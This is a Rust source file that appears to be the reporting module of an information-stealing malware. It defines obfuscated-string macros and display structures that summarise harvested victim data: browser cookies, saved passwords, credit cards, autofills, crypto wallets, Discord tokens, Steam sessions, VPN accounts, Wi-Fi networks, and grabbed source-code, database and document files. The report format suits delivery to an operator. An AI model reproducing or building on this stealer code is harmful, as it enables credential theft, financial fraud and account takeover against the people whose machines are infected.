use crate::{format, Collector};
use crate::{Browser, Device, FileGrabber, Software, Vpn};
use alloc::string::ToString;
use alloc::sync::Arc;
use alloc::vec::Vec;
use core::fmt::{Display, Formatter};
use derive_new::new;

macro_rules! collector_block {
    (
        $block_emoji:expr, $block_name:expr, [
            $( ($field_emoji:expr, $field_name:expr, $field_value:expr) ),* $(,)?
        ]
    ) => {{
        CollectorBlock::new(
            obfstr::obfstr!($block_emoji),
            obfstr::obfstr!($block_name),
            [
                $(
                    CollectorField::new(
                        obfstr::obfstr!($field_emoji),
                        obfstr::obfstr!($field_name),
                        Arc::from(format!("{}", $field_value)),
                    )
                ),*
            ],
        )
    }};
}

#[derive(new)]
pub struct CollectorField {
    #[new(into)]
    pub emoji: Arc<str>,
    #[new(into)]
    pub name: Arc<str>,
    pub value: Arc<str>,
}

#[derive(new)]
pub struct CollectorBlock {
    #[new(into)]
    pub emoji: Arc<str>,
    #[new(into)]
    pub name: Arc<str>,
    #[new(into)]
    pub fields: Arc<[CollectorField]>,
}

pub(crate) trait DisplayBuilder {
    fn build_block(&self) -> CollectorBlock;
}

pub struct EmojiBoolean(pub bool);

impl Display for EmojiBoolean {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        if self.0 {
            write!(f, "✅")
        } else {
            write!(f, "❌")
        }
    }
}

pub trait CollectorDisplay: Collector {
    fn display_blocks(&self) -> Arc<[CollectorBlock]>;
}

impl<T: Collector> CollectorDisplay for T {
    fn display_blocks(&self) -> Arc<[CollectorBlock]> {
        Arc::from([
            collector_block!(
                "🔍",
                "Browser Data",
                [
                    ("🍪", "Cookies", self.get_browser().get_cookies()),
                    ("🔐", "Passwords", self.get_browser().get_passwords()),
                    ("💳", "Credit Cards", self.get_browser().get_credit_cards()),
                    ("✍️", "Autofills", self.get_browser().get_auto_fills()),
                    ("🕘", "History", self.get_browser().get_history()),
                    ("📑", "Bookmarks", self.get_browser().get_bookmarks()),
                    ("⬇️", "Downloads", self.get_browser().get_downloads()),
                ]
            ),
            collector_block!(
                "💻",
                "Installed Software",
                [
                    ("👛", "Wallets", self.get_software().get_wallets()),
                    ("📁", "FTP Hosts", self.get_software().get_ftp_hosts()),
                    ("📲", "Telegram", EmojiBoolean(self.get_software().is_telegram())),
                    ("🎮", "Discord Tokens", self.get_software().get_discord_tokens()),
                    ("🕹️", "Steam Sessions", self.get_software().get_steam_session()),
                ]
            ),
            collector_block!(
                "📂",
                "User Files",
                [
                    ("🧑‍💻", "Source Code", self.get_file_grabber().get_source_code_files()),
                    ("🗃️", "Databases", self.get_file_grabber().get_database_files()),
                    ("📄", "Documents", self.get_file_grabber().get_documents()),
                ]
            ),
            collector_block!(
                "🌐",
                "VPN",
                [
                    ("🔐", "Accounts", self.get_vpn().get_accounts()),
                ]),
            collector_block!(
                "📶",
                "Device Data",
                [
                    ("📡", "Wi-Fi Networks", self.get_device().get_wifi_networks()),
                ]
            )
        ])
    }
}

pub struct PrimitiveDisplayCollector<'a, T: Collector>(pub &'a T);

impl<T: Collector> Display for PrimitiveDisplayCollector<'_, T> {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        for block in self.0.display_blocks().iter() {
            writeln!(f, "▶ {}:", block.name)?;
            for (i, field) in block.fields.iter().enumerate() {
                let prefix = if i + 1 == block.fields.len() { "└─" } else { "├─" };
                writeln!(f, "{} {}: {}", prefix, field.name, field.value)?;
            }
        }

        Ok(())
    }
}
